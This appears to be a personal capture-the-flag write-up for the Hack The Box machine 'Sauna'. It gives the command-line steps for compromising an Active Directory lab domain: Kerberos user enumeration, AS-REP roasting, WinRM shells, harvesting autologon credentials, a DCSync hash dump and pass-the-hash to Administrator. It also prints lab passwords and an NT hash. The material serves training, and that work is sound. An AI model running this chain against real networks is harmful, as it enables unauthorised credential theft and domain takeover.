---
title: Sauna
draft: false
tags:
---
![[Pasted image 20250301142320.png]]
Machine: https://app.hackthebox.com/machines/Sauna
# 1º Enumeration
## Services & Versions
- Ports discovery
```bash
nmap -p- -sS -n -Pn --min-rate 5000 10.10.10.175 -oG allPorts
```
>[!example]- Result
![[Pasted image 20250301141118.png]]

- versions discovery
```bash
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49675,49689,49697 -sVC -n -Pn --min-rate 5000 -oN Targeted
```
>[!example]- Result
>![[Pasted image 20250301141750.png]]

*Domain:* "Egotistical-bank.local"

## Web Page
### Enumerate Web Content
- can find this users / names on the web pages: `Janny Joy, James Doe, Admin, Johnson, Watson, `
- There is a interesting form `http://10.10.10.175/single.html`
>[!example]- Result
>![[Pasted image 20250303180803.png]]

- But we can't use it
>[!example]- Result
>![[Pasted image 20250303180845.png]]

- we have some potential users (we can try some name formating like `fergus smith -> fsmith`)
>[!example]- Result
>![[Pasted image 20250303193758.png]]

#### Used tecnologies
- using [[whatweb]] and [[wappanalyzer]]
>[!example]- Result
>![[Pasted image 20250303180427.png]]
>![[Pasted image 20250303180456.png]]

#### Web Directory Enumeration
- we can use [[gobuster]] to enumerate more web pages and resources, but nothing interesting
```bash
gobuster dir -u http://10.10.10.175 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --add-slash -t 50

gobuster vhost -u http://EGOTISTICAL-BANK.LOCAL -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```
>[!example]- Result
>![[Pasted image 20250303181822.png]]

## Kerberos
- Valid users enumeration
```bash
kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -t 50
```
>[!example]- Result
>![[Pasted image 20250303180055.png]]

## SMB
- We can try to enumerate shares using [[smbclient]] [[rpcclient]], [[smbmap]] and [[crackmapexec]], but with a null session we can see nothing
```bash
smbclient -N -L //10.10.10.175
crackmapexec smb --shares 10.10.10.175 -u ''
smbmap -H 10.10.10.175 -u ''
rpcclient 10.10.10.175 -U '' -N -c 'enumdomusers'
```
## LDAP
- we can try [[ldapsearch]] in order to find users or useful information, without credencials
```bash
ldapsearch -H ldap://10.10.10.175 -x -s base
```
>[!example]- Result
>![[Pasted image 20250303185450.png]]

- found a user `sauna`, and this "namingContexts" (use full to keep enumerating)
>[!example]- Result
>![[Pasted image 20250303185707.png]]

- Lets use this naming contexts, and we found some users like 'Hugo Smith'
```bash
ldapsearch -H ldap://10.10.10.175 -x -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
```
>[!example]- Result
>![[Pasted image 20250303190120.png]]

## Getting Valid Creds
- now we have 2 valid users (and a list of users from kerberos) so we can try to perform a AS-REP Roasting attack using [[impacket-GetNPUsers]]
```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile users
```
>[!example]- Result
>![[Pasted image 20250303190850.png]]
>![[Pasted image 20250303192219.png]]

- perfect now we have the password `fsmith:Thestrokes23`
>[!example]- Result
>![[Pasted image 20250303193000.png]]

# 2º Enumeration (With creds)

## SMB
- Enumerating shares
```bash
smbmap -H 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
```
>[!example]- Result
>![[Pasted image 20250303193849.png]]

- but there are not important information

## RPC
- we can get some users info or groups
>[!example]- result
>![[Pasted image 20250303194610.png]]


## BloodHaund
- we can get all info using [[bloodhaund-python]] and then import it to [[bloodhaunt]]
```bash
bloodhound-python -d EGOTISTICAL-BANK.LOCAL -u 'fsmith' -p 'Thestrokes23' -c ALL -ns 10.10.10.175 --dns-tcp
```
- perfect, now we can view the AD structure
>[!example]- Result
>![[Pasted image 20250303195553.png]]

- `svc_loadmgr` looks really interesting
>[!example]- Result
>![[Pasted image 20250303195856.png]]

# Intrusion
- At the same time the user 'fsmith' is in the group 'remote management users' so we can use [[evil-winrm]] in order to get a interactive shell
```bash
evil-winrm --ip 10.10.10.175 -u fsmith -p 'Thestrokes23'
```
>[!example]- Result
>![[Pasted image 20250303201416.png]]

# Lateral Movement
## System Enumeration
- We cant use [[mimikatz]] to dump credentials (because is a privileged action), as we are in the IIS machine we can read some configuration files into `\inetpub\wwwroot`
```bash
dir -Force
```
- `-Force`: to list hidden resources

- but there are no configuration files here, so lets keep enumerating, we can run [[PrivescCheck]] to get more info
```bash
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```
>[!example]- Result
>![[Pasted image 20250303221845.png]]

- but nothing especial, lets keep enumerating with [[PowerUP]], and nothing interesting
>[!example]- Result
>![[Pasted image 20250303223722.png]]

- now with [[winPEAS]], and we found a autologgon key
```
.\winPEASx64.exe
```
>[!example]- Result
>![[Pasted image 20250304190129.png]]

- lets use this credentials `svc_loanmgr:Moneymakestheworldgoround!`
```bash
evil-winrm --ip 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```
>[!example]- Result
>![[Pasted image 20250304190929.png]]


# Privilege Escalation
- So, as we saw on the previus part, this user have 'DCSYNC' with the DC so we can perform a DCSYNC Attack
>[!example]- Result
>![[Pasted image 20250304191145.png]]

- DCSYNC Attack using [[impacket-secretsdump]]:
```bash
impacket-secretsdump 'EGOTISTICAL-BANK.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@'10.10.10.175'
```
>[!example]- Result
>![[Pasted image 20250304192530.png]]

- Perfect now we have all NT hashes and we can now perform a pash-the-hash attack, we can check it using [[crackmapexec]]
```bash
crackmapexec smb 10.10.10.175 -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e'
```
>[!example]- Result
>![[Pasted image 20250304193028.png]]

- now we can get a shell using [[psexec.py]]
```bash
psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 -hashes ':823452073d75b9d1cf70ebdf86c7f98e'
```
>[!Example]- Result
>![[Pasted image 20250304193955.png]]

